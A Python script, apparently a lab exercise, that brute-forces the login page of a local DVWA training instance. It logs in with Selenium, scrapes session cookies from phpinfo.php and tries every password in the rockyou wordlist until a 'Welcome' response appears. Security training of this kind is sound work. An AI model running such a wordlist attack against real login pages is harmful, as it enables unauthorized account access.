import requests
from selenium import webdriver
import time
import pyautogui

file = "E:/Pulpit/rockyou.txt"
page = "http://localhost/dvwa/vulnerabilities/brute/"


class CrackPassword:

    def get_cookies(self):
        """Taking Cookies for headers using selenium"""

        chrome_driver_path = "C:/Development/chromedriver.exe"
        driver = webdriver.Chrome(executable_path=chrome_driver_path)

        driver.get("http://localhost/dvwa/login.php")
        pyautogui.hotkey("ctrl", "w")
        driver.maximize_window()

        user_input = driver.find_element_by_name("username")
        user_input.send_keys("admin")

        passwd_input = driver.find_element_by_name("password")
        passwd_input.send_keys("password")

        submit = driver.find_element_by_name("Login")
        submit.click()

        time.sleep(.5)
        driver.switch_to.default_content()
        time.sleep(.5)

        driver.get("http://localhost/dvwa/phpinfo.php")
        body = driver.find_element_by_xpath('/html/body/div/table[6]/tbody')
        content = body.text.split()
        Cookies = ""
        for element in content:
            if "PHPSESSID" in element:
                Cookies += f"{element} "
            if "security" in element:
                Cookies += element
                break
        return Cookies

    def crack_password(self, username, cookies):

        headers = {
            "Cookie": cookies,
        }

        with open(file, errors="ignore", encoding="utf-8") as passwords:
            """Taking passwords from file and giving requests to page to check if this password matches"""
            payload = {"user_token": 'View Help', "username": str(username).strip(), "password": '', "Login": "Login"}
            for password in passwords:
                payload["password"] = str(password).strip()
                try:
                    r1 = requests.get(page, params=payload, headers=headers)
                except:
                    try:
                        r1 = requests.get(page, params=payload, headers=headers)
                    except:
                        continue
                if 'Login :: Damn Vulnerable Web Application' in r1.text:
                    return "Security of this page is too high to crack the password :("
                elif "security=medium" in headers["Cookie"]:
                    return "Security level is higher than normal. It will take in hell of time to crack the password."
                try:
                    if 'Welcome' in r1.text:
                        return password
                except NameError:
                    return "Security of this page is too high to crack the password :("
            return "The password was not cracked :("
